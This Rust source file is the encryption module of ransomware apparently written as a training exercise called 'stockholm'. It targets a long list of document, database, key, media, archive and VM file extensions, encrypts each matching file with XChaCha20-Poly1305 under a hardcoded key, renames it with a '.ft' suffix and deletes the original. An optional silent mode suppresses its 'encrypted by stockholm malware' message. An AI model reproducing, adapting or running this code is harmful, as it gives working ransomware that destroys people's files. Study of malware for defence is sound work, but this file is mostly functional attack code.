use std::io::{Read, Write};
use std::path::PathBuf;
use std::error::Error;
use chacha20poly1305::{XChaCha20Poly1305, KeyInit, aead::Aead};
use crate::custom_error::CustomError;
use rand;
use std::fs::{File, rename, remove_file};

const FILE_EXTENSIONS: &[&str] = &[
    "der", "pfx", "key", "crt", "csr", "p12", "pem",
    "odt", "ott", "sxw", "stw", "uot", "3ds", "max", 
    "3dm", "ods", "ots", "sxc", "stc", "dif", "slk", 
    "wb2", "odp", "otp", "sxd", "std", "uop", "odg", 
    "otg", "sxm", "mml", "lay", "lay6", "asc", "sqlite3", 
    "sqlitedb", "sql", "accdb", "mdb", "db", "dbf", "odb", 
    "frm", "myd", "myi", "ibd", "mdf", "ldf", "sln", 
    "suo", "cs", "c", "cpp", "pas", "h", "asm", "js", 
    "cmd", "bat", "ps1", "vbs", "vb", "pl", "dip", "dch", 
    "sch", "brd", "jsp", "php", "asp", "rb", "java", 
    "jar", "class", "sh", "mp3", "wav", "swf", "fla", 
    "wmv", "mpg", "vob", "mpeg", "asf", "avi", "mov", 
    "mp4", "3gp", "mkv", "3g2", "flv", "wma", "mid", 
    "m3u", "m4u", "djvu", "svg", "ai", "psd", "nef", 
    "tiff", "tif", "cgm", "raw", "gif", "png", "bmp", 
    "jpg", "jpeg", "vcd", "iso", "backup", "zip", "rar", 
    "7z", "gz", "tgz", "tar", "bak", "tbk", "bz2", "PAQ", 
    "ARC", "aes", "gpg", "vmx", "vmdk", "vdi", "sldm", 
    "sldx", "sti", "sxi", "602", "hwp", "snt", "onetoc2", 
    "dwg", "pdf", "wk1", "wks", "123", "rtf", "csv", 
    "txt", "vsdx", "vsd", "edb", "eml", "msg", "ost", 
    "pst", "potm", "potx", "ppam", "ppsx", "ppsm", "pps", 
    "pot", "pptm", "pptx", "ppt", "xltm", "xltx", "xlc", 
    "xlm", "xlt", "xlw", "xlsb", "xlsm", "xlsx", "xls", 
    "dotx", "dotm", "dot", "docm", "docb", "docx", "doc"
];
const READ_SIZE: usize = 4096;
const KEY : &[u8 ; 32] = &[1, 1, 2, 3, 1, 5, 8, 8, 8, 7, 8, 5, 9, 9, 4, 4, 1, 1, 2, 3, 1, 5, 8, 8, 8, 7, 8, 5, 9, 9, 4, 4];
const RED: &str = "\x1b[31m";
const RESET: &str = "\x1b[0m";


fn get_random_nonce() -> [u8 ; 24] {
	let nonce: [u8 ; 24] = rand::random();
	return nonce;
}


fn get_new_filename(filename: &PathBuf) -> Result<PathBuf, CustomError> {
	let mut new_name = filename.clone();
	if let Some(ext) = new_name.extension().and_then(|e| e.to_str()) {
			if FILE_EXTENSIONS.contains(&ext) == true {
				new_name.set_extension(format!("{}.{}", ext, "ft"));
				return Ok(new_name);
			} else {
				return Err(CustomError::WrongExtension);
			}
	}
	return Err(CustomError::WrongExtension)
}


fn	encrypt_content(contents: &[u8], nonce: &[u8 ; 24]) -> Result<Vec<u8>,  Box<dyn Error>> {
	let cipher = XChaCha20Poly1305::new(KEY.into());
	match cipher.encrypt(nonce.into(), contents.as_ref()) {
		Ok(encrypted_content) => {return Ok(encrypted_content)},
		Err(_) => {	return Err(Box::new(CustomError::EncryptionError))},
	}
}


fn encrypt_file(filename: &PathBuf, silent: bool) -> Result<(), Box<dyn Error>> {
	let nonce = get_random_nonce();
	let new_name = get_new_filename(filename)?;
	let mut tmp = File::create(".tmp_sotckholm_file")?;
	let mut file = File::open(filename)?;
	let mut read_buf: [u8 ; READ_SIZE] = [0 ; READ_SIZE];
	tmp.write_all(&nonce)?;
	loop {
		let n = file.read(&mut read_buf)?;
		if n == 0 {break;}
		let write_buffer = encrypt_content(&read_buf[..n], &nonce)?;
		tmp.write(&write_buffer)?;
	}
	rename(".tmp_sotckholm_file", new_name)?;
	remove_file(filename)?;
	if silent == false {
		println!("{}stockholm: {} has been encrypted by stockholm malware{}", RED, filename.display(), RESET);
	}
	return Ok(());
}


pub fn encrypt(files: &Vec<PathBuf>, silent: bool) -> Result<(), Box<dyn Error>> {
	for filename in files {
		let _ = encrypt_file(filename, silent);
	}
	let _ = remove_file(".tmp_sotckholm_file");
	return Ok(());
}